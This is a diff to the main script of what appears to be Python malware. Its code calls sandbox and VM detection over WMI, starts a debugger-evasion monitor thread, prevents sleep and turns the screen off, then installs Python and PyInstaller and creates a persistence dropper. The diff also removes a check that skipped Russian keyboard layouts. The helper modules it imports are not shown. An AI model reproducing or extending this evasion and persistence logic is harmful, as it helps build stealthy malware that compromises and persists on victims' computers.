@@ -2,13 +2,14 @@ import sys
 from time import sleep
 from Persistance.foothold import get_pyinstaller,install_python,create_dropper
 from Utils.helpers import is_python_exist,is_online,find_python_path,is_admin
-from sys import exit as sys_exit
-from os.path import join as path_join
+from threading import Thread
 from Evasion import debugEvasion,vmDetect
-from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off,get_keyboard_language
+from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off
+
 
 #//TODO: instead of sys.exit. spawn subprocess to delete the whole thing before.
 def main():
+    Thread(target=debugEvasion.process_monitor,args=()).start()
     debug = True #if true -- vm evasion will result only in printing!
     vm_flag = sys.exit if not debug else lambda x: print(x)
     prevent_sleep()
@@ -35,9 +36,6 @@ def main():
     if vmDetect.detect_vm_by_wmi():
         vm_flag("detected vm by wmi") #another vm evade
         #we do the detect_vm as last check as this is noisy AF
-    if get_keyboard_language() in ["0x819","0x043b"]:
-        vm_flag("WE ARE NOT GONNA RUN IN RUSSIA")
-    print(get_keyboard_language())
     if not is_python_exist():
         install_python()
 
@@ -47,6 +45,7 @@ def main():
     else:
         get_pyinstaller(pythonPath)
     create_dropper() #in the end, when we installed everything --> we create dropper
+    return
 
 
 if __name__ == "__main__":
